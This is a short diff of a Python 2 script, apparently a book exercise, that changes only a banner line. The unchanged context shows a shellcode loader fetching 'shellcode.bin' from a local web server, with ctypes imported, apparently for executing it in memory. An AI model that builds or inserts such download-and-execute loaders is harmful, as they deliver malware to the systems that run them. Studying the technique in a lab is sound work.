@@ -1,7 +1,7 @@
 import urllib2, ctypes, base64
 
 def banner():
-	print "[***]	Python Shellcode execution p116		[***]"
+	print "[***]	Shellcode execution p116	[***]"
 
 url = "http://localhost:8000/shellcode.bin"
 response = urllib2.urlopen(url)
